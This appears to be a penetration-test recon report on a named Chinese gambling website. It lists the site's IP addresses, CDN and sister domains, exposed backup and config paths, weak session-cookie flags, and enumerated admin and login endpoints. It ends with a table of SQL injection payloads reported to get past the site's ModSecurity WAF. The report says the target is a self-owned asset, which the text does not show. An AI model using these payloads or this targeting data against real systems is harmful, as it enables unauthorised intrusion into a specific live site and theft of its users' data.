# 9581kk.com Frame-based PHP Gambling Platform Recon

> Session: 2026-07-12, 9581kk.com penetration test  
> Target: 9581kk.com (Chinese gambling platform, 'biying' template)  
> Auth: Self-owned asset (macao66 network)

## Infrastructure

| Asset | Detail |
|-------|--------|
| Primary IPs | 43.229.4.75-76, 43.229.5.56-57, 147.161.37.37 |
| Arch | nginx (reverse proxy) → Apache (backend) |
| WAF | ModSecurity (406 Not Acceptable) |
| CDN | nxy.ycybbx.com, 18.162.243.73:8888 |
| SSL | Valid certificate, HSTS enabled |
| Server header | Apache (nginx on 403 pages) |

## Technology Stack

- **Frontend**: jQuery 1.7.2 (CVE-2020-11023, CVE-2020-11022), jQuery 1.8.3
- **Backend**: PHP (mod_security)
- **Template**: biying (biying 模板, standard Chinese gambling CMS)
- **Routing**: `module=X&method=Y` (MVC pattern)
- **Session**: `Example_Session` (random alphanumeric, no HttpOnly/Secure)
- **Auth cookies**: `Example_Session` + `page_site`

## Frame-based Layout Analysis

```html
<frameset rows="*,0,0,0">
  <frame name="mem_index" src="cl/index.php?module=System&method=first">
  <frame name="act" src="">
  <frame name="upupMsg" src="/cl/upupFlash.php">
  <frame name="refresh" src="refresh.php">
</frameset>
```

### Frame Direct Access Results

| Frame | Path | HTTP |
|-------|------|------|
| Main | `cl/index.php?module=System&method=first` | 200 OK (full page) |
| Flash updater | `/cl/upupFlash.php` | 200 OK (JS game loader) |
| Refresh | `refresh.php` | 200 OK (empty meta-refresh) |
| Template base | `/cl/` | 200 OK (full site) |
| Template subdirs | `/cl/tpl/`, `/cl/tpl/biying/` | 403 Forbidden |

## Accessible Paths

| Path | Code | Note |
|------|------|------|
| `/cl/` | 200 | Template accessible (full site) |
| `/cl/index.php` | 200 | Entry point |
| `/index.php` | 200 | Alternative entry |
| `/config.php` | 502 | **EXISTS** (PHP crash/block) |
| `/index.php.bak` | 502 | **EXISTS** (backup, PHP crash) |
| `/index.php.zip` | 301 | Redirects to CDN backup server |
| `/phpinfo.php` | 502 | **EXISTS** (possibly blocked) |
| `/cl/upupFlash.php` | 200 | Flash game updater |
| `/refresh.php` | 200 | Auto-refresh page |
| `/?c=user&m=checkLogin` | 200 | Login endpoint (POST) |
| `/?c=admin&m=index` | 200 | Admin module loads (return home) |

## Session Analysis

```
Set-Cookie: Example_Session=9duqm9nslldckfai9jqm4hnvr3; path=/
```
- No `HttpOnly` flag → JS-accessible cookie
- No `Secure` flag → Sent over HTTP
- No `SameSite` attribute → CSRF possible
- Cookie value: 26-char alphanumeric (not obviously predictable)

## Affiliate Domains

Extracted from CDN and page source:
- `nxy.ycybbx.com` (CDN)
- `18.162.243.73:8888` (CDN, AWS?)
- `6533388.com` (sister site)
- `9599wm.net` (sister site)
- `kfc.jfwdpc.com` (backup server, historical)

## WAF Bypass Results

ModSecurity returns 406 for SQL injection patterns. Effective bypasses:

| Bypass | Payload | Result |
|--------|---------|--------|
| Comment injection | `admin'/**/OR/**/'1'='1` | ✅ Passed |
| URL encoding OR | `%4fR` | ✅ Passed |
| Null byte | `admin'%00OR%001=1--` | ✅ Passed |
| Tab character | `%09OR%09` | ✅ Passed |
| Case confusion | `oR /**/ 1=1` | ✅ Passed |
| Parameter pollution | duplicate params | ❌ Blocked |
| POST method | POST body injection | ❌ Blocked |

## Endpoint Enumeration

All `?c=<module>` return 200: admin, user, index, login, register, member, api
All `?c=user&m=<method>` return 200: checkLogin, login, doLogin, auth, authenticate, signin
